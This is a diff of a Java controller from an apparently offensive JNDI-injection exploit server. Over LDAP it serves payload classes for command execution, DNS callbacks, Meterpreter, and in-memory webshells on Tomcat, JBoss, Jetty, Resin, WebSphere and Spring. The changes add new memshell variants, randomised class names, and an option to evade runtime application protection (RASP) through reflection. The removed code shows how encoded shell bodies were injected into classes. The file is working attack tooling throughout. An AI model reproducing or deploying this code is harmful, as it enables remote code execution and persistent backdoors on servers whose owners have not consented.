@@ -1,12 +1,22 @@
 package com.nu1r.jndi.controllers;
 
+import com.nu1r.jndi.enumtypes.GadgetType;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
-import com.nu1r.jndi.gadgets.utils.Utils;
+import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.template.*;
+import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
+import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
+import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
+import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
+import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
+import com.nu1r.jndi.template.resin.RFMSFromThreadF;
+import com.nu1r.jndi.template.resin.RSMSFromThreadS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
+import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
+import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.utils.Config;
 import com.nu1r.jndi.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
@@ -18,15 +28,19 @@ import org.apache.commons.codec.binary.Base64;
 
 import java.net.URL;
 
-import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
+import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
+import static com.nu1r.jndi.utils.Config.URL_PATTERN;
+import static com.nu1r.jndi.utils.Config.Shell_Type;
+import static com.nu1r.jndi.utils.Config.IS_OBSCURE;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
     //最后的反斜杠不能少
     private final String      codebase = Config.codeBase;
-    private       PayloadType type;
-    private String[]    params;
+    private       PayloadType payloadType;
+    private       String[]    params;
+    private       GadgetType  gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -36,14 +50,13 @@ public class BasicController implements LdapController {
         CtClass   ctClass;
         ClassPool pool;
 
-
-        switch (type) {
+        switch (payloadType) {
             case dnslog:
                 DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0]);
                 dnslogTemplate.cache();
                 className = dnslogTemplate.getClassName();
                 break;
-            case command:
+            case nu1r:
                 CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                 commandTemplate.cache();
                 className = commandTemplate.getClassName();
@@ -60,75 +73,85 @@ public class BasicController implements LdapController {
                 className = SpringEchoTemplate.class.getName();
                 break;
             case tomcatfilterjmx:
-                className = "TFMSFromJMXF";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromJMXF");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
+                ctClass = pool.get(TFMSFromJMXF.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatfilterth:
-                className = "TFMSFromThreadF";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromThreadF");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
+                ctClass = pool.get(TFMSFromThreadF.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatlistenerjmx:
-                className = "TLMSFromJMXLi";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromJMXLi");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
+                ctClass = pool.get(TLMSFromJMXLi.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatlistenerth:
-                className = "TLMSFromThreadLi";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromThreadLi");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
+                ctClass = pool.get(TLMSFromThreadLi.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatservletjmx:
-                className = "TSMSFromJMXS";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
+                ctClass = pool.get(TSMSFromJMXS.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatservletth:
-                className = "TSMSFromThreadS";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromThreadS");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
+                ctClass = pool.get(TSMSFromThreadS.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case jbossfilter:
-                className = "JBFMSFromContextF";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBFMSFromContextF");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
+                ctClass = pool.get(JBFMSFromContextF.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case jbossservlet:
-                className = "JBSMSFromContextS";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBSMSFromContextS");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
+                ctClass = pool.get(JBSMSFromContextS.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case webspherememshell:
                 className = WebsphereMemshellTemplate.class.getName();
                 break;
             case springinterceptor:
                 pool = ClassPool.getDefault();
-                ctClass = pool.get("com.nu1r.jndi.template.spring.SpringInterceptorMS");
+                pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
+                ctClass = pool.get(SpringInterceptorMS.class.getName());
+                pool.insertClassPath(new ClassClassPath(SpringMemshellTemplate.class));
                 String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
                 CtClass springTemplateClass = pool.get(target);
                 // 类名后加时间戳
@@ -143,44 +166,76 @@ public class BasicController implements LdapController {
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                 ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case issuccess:
                 className = isSuccess.class.getName();
                 break;
             case jettyfilter:
-                className = "JFMSFromJMXF";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.jetty.JFMSFromJMXF");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
+                ctClass = pool.get(JFMSFromJMXF.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case jettyservlet:
-                className = "JSMSFromJMXS";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.jetty.JSMSFromJMXS");
-                insertKeyMethod(ctClass, "bx");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
+                ctClass = pool.get(JSMSFromJMXS.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case wsfilter:
-                className = "WSFMSFromThread";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
-                insertKeyMethod(ctClass, "ws");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
+                ctClass = pool.get(WSFMSFromThread.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case tomcatexecutor:
-                className = "TWSMSFromThread";
-                pool      = ClassPool.getDefault();
-                ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TWSMSFromThread");
-                insertKeyMethod(ctClass, "execute");
-                ctClass.setName(className);
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
+                ctClass = pool.get(TWSMSFromThread.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
+                ctClass.setName(generateClassName());
                 className = ctClass.getName();
+                ctClass.writeFile();
+                break;
+            case resinfilterth:
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
+                ctClass = pool.get(RFMSFromThreadF.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
+                className = ctClass.getName();
+                ctClass.writeFile();
+                break;
+            case resinservletth:
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
+                ctClass = pool.get(RSMSFromThreadS.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
+                className = ctClass.getName();
+                ctClass.writeFile();
                 break;
             case meterpreter:
                 className = Meterpreter.class.getName();
+                break;
+            case tomcatupgrade:
+                pool = ClassPool.getDefault();
+                pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
+                ctClass = pool.get(TUGMSFromJMXuP.class.getName());
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                ctClass.setName(generateClassName());
+                className = ctClass.getName();
+                ctClass.writeFile();
                 break;
         }
 
@@ -205,19 +260,54 @@ public class BasicController implements LdapController {
             if (secondIndex < 0) secondIndex = base.length();
 
             try {
-                type = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
+                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
+                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
 
-            switch (type) {
+            int thirdIndex = base.indexOf("/", secondIndex + 1);
+            if (thirdIndex != -1) {
+                if (thirdIndex < 0) thirdIndex = base.length();
+                try {
+                    gadgetType = gadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Payload >> |@" + gadgetType));
+                } catch (IllegalArgumentException e) {
+                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
+                }
+            }
+
+            if (gadgetType == GadgetType.urlr) {
+                String url1    = Util.getCmdFromBase(base);
+                int    result1 = url1.indexOf("-");
+                if (result1 != -1) {
+                    String[] U = url1.split("-");
+                    int      i = U.length;
+                    if (i >= 1) {
+                        URL_PATTERN = U[0];
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
+                    }
+                    if (i >= 2) {
+                        Shell_Type = U[1];
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
+                    }
+                    if (i >= 3) {
+                        IS_OBSCURE = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP >> |@" + U[2]));
+                    }
+                } else {
+                    URL_PATTERN = url1;
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
+                }
+            }
+
+            switch (payloadType) {
                 case dnslog:
                     String url = base.substring(base.lastIndexOf("/") + 1);
                     System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                     params = new String[]{url};
                     break;
-                case command:
+                case nu1r:
                     String cmd = Util.getCmdFromBase(base);
                     System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                     params = new String[]{cmd};
@@ -234,99 +324,5 @@ public class BasicController implements LdapController {
 
             throw new IncorrectParamsException("Incorrect params >> " + base);
         }
-    }
-
-
-    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
-
-        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
-        String name = ctClass.getName();
-        name = name.substring(name.lastIndexOf(".") + 1);
-        boolean isTomcat = name.startsWith("T");
-
-        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
-        String method = "";
-
-        CtClass[] classes = ctClass.getInterfaces();
-        for (CtClass aClass : classes) {
-            String iName = aClass.getName();
-            if (iName.equals("javax.servlet.Servlet")) {
-                method = "service";
-                break;
-            } else if (iName.equals("javax.servlet.Filter")) {
-                method = "doFilter";
-                break;
-            } else if (iName.equals("javax.servlet.ServletRequestListener")) {
-                method = "requestInitializedHandle";
-                break;
-            } else if (iName.equals("javax.websocket.MessageHandler$Whole")) {
-                method = "onMessage";
-                break;
-            }
-        }
-
-        CtClass supClass = ctClass.getSuperclass();
-        if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
-            method = "execute";
-            isTomcat = false;
-        }
-
-        switch (type) {
-            // 冰蝎类型的内存马
-            case "bx":
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-
-                if (isTomcat) {
-                    insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
-                } else {
-                    insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
-                }
-                break;
-            case "ws":
-                insertCMD(ctClass);
-
-                insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
-                break;
-            case "execute":
-                ctClass.addField(CtField.make("public static final String DEFAULT_SECRET_KEY = \"nu1r\";", ctClass));
-                ctClass.addField(CtField.make("private static final String AES = \"AES\";", ctClass));
-                ctClass.addField(CtField.make("private static final byte[] KEY_VI = \"nu1r\".getBytes();", ctClass));
-                ctClass.addField(CtField.make("private static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\";", ctClass));
-                ctClass.addField(CtField.make("private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();", ctClass));
-                insertCMD(ctClass);
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));
-
-                insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
-                break;
-        }
-    }
-
-    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
-        // 根据传入的不同参数，在不同方法中插入不同的逻辑
-        CtMethod cm = ctClass.getDeclaredMethod(method);
-        cm.setBody(payload);
-    }
-
-    /**
-     * 向指定类中写入命令执行方法 execCmd
-     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
-     *
-     * @param ctClass 指定类
-     * @throws Exception 抛出异常
-     */
-    public static void insertCMD(CtClass ctClass) throws Exception {
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(DECODE), ctClass));
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-        try {
-            ctClass.getDeclaredMethod("getFieldValue");
-        } catch (NotFoundException e) {
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-        }
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
     }
 }
